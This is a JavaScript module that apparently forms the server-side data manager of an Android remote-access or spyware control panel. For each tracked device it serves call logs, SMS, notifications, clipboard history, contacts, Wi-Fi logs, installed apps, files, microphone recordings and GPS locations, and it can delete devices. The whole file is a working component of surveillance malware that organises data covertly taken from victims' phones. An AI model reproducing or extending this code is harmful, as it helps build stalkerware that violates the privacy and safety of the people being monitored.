// Data Manager Module
class DataManager {
    constructor(db) {
        this.db = db;
    }

    getClient(clientID) {
        let client = this.db.maindb.get('clients').find({ clientID }).value();
        if (client !== undefined) return client;
        else return false;
    }

    getClientList() {
        return this.db.maindb.get('clients').value();
    }

    getClientListOnline() {
        return this.db.maindb.get('clients').value().filter(client => client.isOnline);
    }

    getClientListOffline() {
        return this.db.maindb.get('clients').value().filter(client => !client.isOnline);
    }

    getClientDataByPage(clientManager, clientID, page, filter = undefined) {
        let client = this.db.maindb.get('clients').find({ clientID }).value();
        if (client !== undefined) {
            let clientDB = clientManager.getClientDatabase(client.clientID);
            let clientData = clientDB.value();

            let pageData;

            if (page === "calls") {
                pageData = clientDB.get('CallData').sortBy('date').reverse().value();
                if (filter) {
                    let filterData = clientDB.get('CallData').sortBy('date').reverse().value()
                        .filter(calls => calls.phoneNo.substr(-6) === filter.substr(-6));
                    if (filterData) pageData = filterData;
                }
            }
            else if (page === "sms") {
                pageData = clientData.SMSData;
                if (filter) {
                    let filterData = clientDB.get('SMSData').value()
                        .filter(sms => sms.address.substr(-6) === filter.substr(-6));
                    if (filterData) pageData = filterData;
                }
            }
            else if (page === "notifications") {
                pageData = clientDB.get('notificationLog').sortBy('postTime').reverse().value();
                if (filter) {
                    let filterData = clientDB.get('notificationLog').sortBy('postTime').reverse().value()
                        .filter(not => not.appName === filter);
                    if (filterData) pageData = filterData;
                }
            }
            else if (page === "wifi") {
                pageData = {};
                pageData.now = clientData.wifiNow;
                pageData.log = clientData.wifiLog;
            }
            else if (page === "contacts") pageData = clientData.contacts;
            else if (page === "permissions") pageData = clientData.enabledPermissions;
            else if (page === "clipboard") pageData = clientDB.get('clipboardLog').sortBy('time').reverse().value();
            else if (page === "apps") pageData = clientData.apps;
            else if (page === "files") pageData = clientData.currentFolder;
            else if (page === "downloads") pageData = clientData.downloads.filter(download => download.type === "download");
            else if (page === "microphone") pageData = clientDB.get('downloads').value().filter(download => download.type === "voiceRecord");
            else if (page === "gps") pageData = clientData.GPSData;
            else if (page === "info") pageData = client;

            return pageData;
        } else return false;
    }

    deleteClient(clientManager, clientID) {
        this.db.maindb.get('clients').remove({ clientID }).write();
        if (clientManager.clientConnections[clientID]) {
            delete clientManager.clientConnections[clientID];
        }
    }
}

module.exports = DataManager;
